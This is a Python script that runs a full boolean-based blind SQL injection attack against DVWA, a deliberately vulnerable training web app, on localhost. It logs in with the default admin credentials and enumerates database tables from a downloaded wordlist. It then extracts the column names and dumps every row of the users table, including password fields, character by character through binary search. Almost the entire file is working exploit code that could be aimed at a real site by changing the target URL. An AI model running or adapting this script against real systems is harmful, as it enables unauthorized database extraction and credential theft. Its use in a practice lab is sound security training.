#!/usr/bin/env python3

# Start the DVWA docker container by using:
# docker run --rm -it -p 80:80 vulnerables/web-dvwa


import httpx
import os
import re


# Default settings for DVWA
TARGET_URL = "http://localhost"
AUTH = {'username':'admin', 'password':'password'}


# Helper functions

## HTTP login
def login():
    client = httpx.Client()
    response = client.get(f"{TARGET_URL}/login.php")
    csrf_token = re.search(r'([a-z0-9]){32}', response.text).group(0)
    data = AUTH | {'Login': 'Login', 'user_token': csrf_token}
    logged = client.post(f"{TARGET_URL}/login.php", data=data)
    if b"<title>Welcome" in logged.content:
        #print("Session:", client.cookies)
        return client
    else:
        raise Exception("Authentication failure")

## Build injection query
def build_injection(payload):
    injection = f"{TARGET_URL}/vulnerabilities/sqli_blind/?Submit=Submit&id={payload}"
    return injection

## Find out if a query is true
def test_injection(injection):
    response = client.get(injection)
    return b"exists in the database" in response.content


############################################
# Method 1: Enumeration using a dictionary #
############################################

client = login()
DICT_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
file_name = DICT_URL.split("/")[-1]

# Download the dictionary file if it doesn't exist yet
if not os.path.exists(file_name):
    url = f"{DICT_URL}"
    with httpx.stream("GET", url) as lines:
        with open(file_name, "wb") as file_dict:
            for chunk in lines.iter_bytes(chunk_size=512):
                file_dict.write(chunk)

# List the tables in the database matching dictionary words
print("Tables found:")
with open(file_name) as file_dict:
    for word in file_dict:
        table = word.rstrip()
        injection = build_injection(f"1' AND (SELECT 1 FROM information_schema.tables WHERE table_name = '{table}') -- -")
        if test_injection(injection):
            print(f"\t{table}")


#################################################
# Method 2: Binary search to query the database #
#################################################


alpha = list(range(ord(' '), ord('z')+1))

def binary_search(query):
    mini, maxi = 0, len(alpha)-1
    delta = maxi - mini
    while delta > 1:
        index = (maxi+mini) // 2
        ascii_value = alpha[index]
        injection = build_injection(f"{query} < {ascii_value} -- -")
        delta = maxi - mini
        if 0 <= delta <= 1:
            return alpha[index]
        if test_injection(injection):
            maxi = index
        else:
            mini = index
    raise Exception("Char not found in column name")

## The table name can be found either using Method 1 or with binary search:
### 1 AND (SELECT SUBSTR(table_name, j, 1) FROM information_schema.tables LIMIT i, 1) > CHAR(64) -- -
### 1 AND (SELECT SUBSTR(table_name, j, 1) FROM information_schema.tables LIMIT i, 1) < CHAR(123) -- -

## Find column names for the table users
table = "users"

## Find number of columns
for column_count in range(30):
    injection = build_injection(f"1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name = '{table}') = {column_count} -- -")
    if test_injection(injection):
        break
print(f"\nThe table '{table}' has {column_count} columns")

# Find length of each column
column_lengths = []
for column_index in range(column_count):
    for column_name_length in range(30):
        injection = build_injection(f"1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name = '{table}' LIMIT {column_index}, 1) = {column_name_length} -- -")
        if test_injection(injection):
            #print(f"The column index {column_index} has length {column_name_length}")
            column_lengths.append(column_name_length)

# Find column names: for each column, find the character in the current name position (column_name_index)
columns = []
for column_index in range(column_count):
    name = []
    for column_name_index in range(1, column_lengths[column_index]+1):
        injection = build_injection(f"1' AND (SELECT ASCII(SUBSTR(column_name, {column_name_index}, 1)) FROM information_schema.columns WHERE table_name = '{table}' LIMIT {column_index}, 1)")
        name.append(chr(binary_search(injection)))
    columns.append("".join(name))
#print(f"The table '{table}' has the columns {columns}")


# Use the column names to find the row values

## Find the number of rows
for row_count in range(50):
    injection = build_injection(f"1' AND (SELECT COUNT(*) FROM {table}) = {row_count} -- -")
    if test_injection(injection):
        break

## Table data dump
print(f"The table '{table}' has {row_count} rows")
print(f"Table '{table}' records:")
print(f"\t{columns}")
for row_index in range(0, row_count):
    row = []
    for column_name in columns:
        name = []
        for row_name_index in range(1, 33):
            injection = build_injection(f"1' AND (SELECT ASCII(SUBSTR({column_name}, {row_name_index}, 1)) FROM users LIMIT {row_index}, 1)")
            name.append(chr(binary_search(injection)))
        row.append("".join(name).rstrip())
    print(f"\t{row}")

# Performance improvements to be made:
## 1. Async requests
## 2. For the data dump, calculate the record length instead of using a fixed value (32)
